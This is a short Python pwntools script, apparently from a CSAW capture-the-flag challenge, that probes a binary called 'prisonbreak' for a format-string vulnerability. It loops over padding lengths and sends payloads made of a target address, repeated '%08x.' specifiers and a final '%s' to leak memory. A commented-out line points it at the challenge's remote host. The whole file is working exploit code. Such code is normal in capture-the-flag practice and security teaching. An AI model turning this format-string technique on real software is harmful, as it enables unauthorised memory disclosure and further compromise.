from pwn import *

addr = "\xac\x20\x60"

for i in range(30):
    
    print("Number of bytes of padding: ", end = "")
    print(i, end=" , ")


    payload = addr + "%08x."*i + "%s"

    print(payload, end=" ")
    print(":")

    io = process("prisonbreak")
    #io = remote("pwn.red.csaw.io", 5004)

    io.recv()
    io.sendline(payload)
    print(io.recv())


